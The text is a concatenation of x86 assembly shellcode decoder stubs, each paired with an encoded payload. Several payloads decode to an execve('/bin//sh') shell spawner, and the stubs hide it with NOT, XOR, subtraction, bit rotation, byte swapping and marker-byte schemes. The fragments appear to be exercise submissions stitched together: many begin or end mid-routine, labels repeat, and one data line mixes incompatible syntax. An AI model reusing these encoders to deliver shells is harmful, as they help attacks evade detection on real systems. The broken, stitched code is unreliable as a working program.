pop esi
xor ecx, ecx
mov cl, 25
decode:
sub byte [esi], 8
not byte [esi]
inc esi
loop decode
jmp short EncodedShellcode
call_shellcode:
call decoder
EncodedShellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87
lea edi, [esi]
xor eax, eax
xor ebx, ebx
switch:
mov bl, byte [esi + eax]
cmp bl, 0xaa
jz shellcode
cmp bl, 0xbb
jz xordecode
jmp notdecode
xordecode:
mov bl, byte [esi + eax + 1]
mov byte [edi], bl
xor byte [edi], 0xDD
inc edi
add al, 3
jmp short switch
notdecode:
mov bl, byte [esi + eax + 1]
mov byte [edi], bl
not byte [edi]
inc edi
add al, 3
jmp short switch
call_decoder:
call decoder
shellcode: db 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa
mov edx, esp
mov cl, 13
decode:
mov bl, byte [esi]
dec ebx
mov byte[edx + eax], bl
inc eax
mov bl, byte [edi]
dec ebx
mov byte [edx + eax], bl
inc eax
inc esi
inc edi
loop decode
jmp edx
call_shellcode:
call decoder
EncodedShellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
xor eax, eax
mov al, 0x1
xor ebx, ebx
decode:
mov bl, BYTE [esi+eax*1]
xor bl, 0xaa
jne EncodedShellcode
mov bl, BYTE [esi+eax*1+0x1]
mov BYTE [edi], bl
inc edi
add al, 0x2
jmp decode
call_decoder:
call decoder
EncodedShellcode: db \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb
mov cl, 0x19
decode:
xor BYTE [esi], 0xaa
inc esi
loop decode
jmp Shellcode
call_decoder:
call decoder
Shellcode: db 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
global _start:
section .text
_start:
jmp call_decoder
decoder:
pop esi
xor ecx, ecx
mov cl, 0x19
decode:
not BYTE [esi]
inc esi
loop decode
jmp EncodedShellcode
call_decoder:
call   decoder
EncodedShellcode: db 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
inc esi
inc esi
mov bx, [esi]
inc esi
inc esi
push esi
mov edi, esi
main:
mov ax,[esi]
xor ax, bx
jz call_decoded
shr ax, cl
not word ax
mov [edi], al
inc esi
inc esi
inc edi
jmp short main
call_decoded:
call [esp]
enc:
call decoder
encoded: dw 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539
jmp short call_decoder
decoder:
pop esi
push esi
mov edi, esi
decode:
mov ax, [esi]
xor ax, 0x539
jz decoded_shellcode
shr ax, 1
sub ax, 13
mov [edi], al
inc esi
inc esi
inc edi
jmp short decode
decoded_shellcode:
call [esp]
call_decoder:
call decoder
encoded_shellcode: dw 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539
mov cl, shellcode_length
check_even_odd:
jmp even_number
odd_number:
rol byte [esi], 0x1
jmp short inc_dec
even_number:
ror byte [esi], 0x1
inc_dec:
inc esi
loop check_even_odd
jmp short shellcode
call_shellcode:
call decoder
shellcode: db 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01
mov al, byte [esi]
xor ecx, ecx
decode:
mov bl, byte [esi+ecx+1]
sub bl, 0x7
mov byte [esi+ecx], bl
inc ecx
cmp al, cl
jnz short decode
jmp shellcode
stage:
call decoder
shellcode: db 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
mov cl, 0x1e
decode:
cmp BYTE [esi],0x7
jl lowbound
sub BYTE [esi],0x7
jmp common_commands
lowbound:
xor ebx, ebx
xor edx, edx
mov bl, 0x7
mov dl, 0xff
inc dx
sub bl, BYTE [esi]
sub dx, bx
mov BYTE [esi], dl
common_commands:
inc esi
loop decode
jmp Shellcode
call_decoder:
call   decoder
Shellcode: db 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87
mov edi, esi
decode:
mov bl, byte [esi]
xor bl, 0xBB
jz formatting
mov cl, byte [esi]
xor cl, 0XAA
jz shift_decode
inc esi
jmp short decode
shift_decode:
mov dl, byte [esi + 1]
shr dl,1
mov byte [esi + 1], dl
inc esi
jmp short decode
formatting:
mov eax, edi
mov bl, byte [eax]
xor bl, 0xBB
jz encoded
format:
mov bl, byte [eax]
mov cl, byte [eax]
xor cl, 0xAA
jnz Next_Cycle
Cycle:
mov dl, byte [eax]
xor dl, 0xBB
jz Next_Cycle
mov dl, byte [eax + 1]
mov byte [eax], dl
inc eax
jmp short Cycle
Next_Cycle:
inc edi
jmp short formatting
call_shellcode:
call decoder
encoded: db 0xAA,0x62,0xc0,0xAA,0xa0,0xAA,0xd0,0xAA,0x5e,0xAA,0x5e,0xAA,0xe6,0xAA,0xd0,0xAA,0xd0,0xAA,0x5e,0xAA,0xc4,0xAA,0xd2,0xAA,0xdc,0x89,0xe3,0xAA,0xa0,0x89,0xe2,0xAA,0xa6,0x89,0xe1,0xb0,0xAA,0x16,0xcd,0x80,0xBB
xor ecx, ecx
xor edx, edx
mov dl, 0x45
jmp short call_decoder
decoder:
pop esi
lea edi, [esi]
decode:
mov bl, byte [edi + ecx]
mov bh, bl
mov al, dl
xor al, bl
jz  short shellcode
mov ax, word [edi + 1 + ecx]
xor ax, bx
mov word [edi], ax
inc ecx
lea edi, [edi + 2]
jmp short decode
call_decoder:
call  decoder
shellcode: db 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4
mul ecx
mov cl, 10
decode_loop:
mov  al, byte [esi]
xchg byte [esi+1], al
mov [esi], al
add esi, 2
loop decode_loop
jmp short encoded_shellcode
shellcode_section:
call decoder
encoded_shellcode: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
pop esi
mov edi, 0xaaaa9090
sub esp, 0x7f
sub esp, 0x7f
sub esp, 0x7f
sub esp, 0x7f
decode:
mov bl, byte [esi + edx + 1]
mov bh, byte [esi + edx + 2]
mov cl, byte [esi + edx + 3]
mov ch, byte [esi + edx + 4]
xor bl, byte [esi + edx]
xor bh, byte [esi + edx]
xor cl, byte [esi + edx]
xor ch, byte [esi + edx]
mov byte [esp + eax], ch
mov byte [esp + eax + 1], cl
mov byte [esp + eax + 2], bh
mov byte [esp + eax + 3], bl
cmp dword [esi + edx + 5], edi
jz execute_shellcode
inc edx
inc edx
inc edx
inc edx
inc edx
add eax, 4
jnz decode
execute_shellcode:
jmp short esp
call_shellcode:
call decoder
encoder_shellcode: db 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa
cmp byte [esi], 0x88
jz shellcode
not byte [esi]
add byte [esi], 0x02
xor byte [esi], 0x97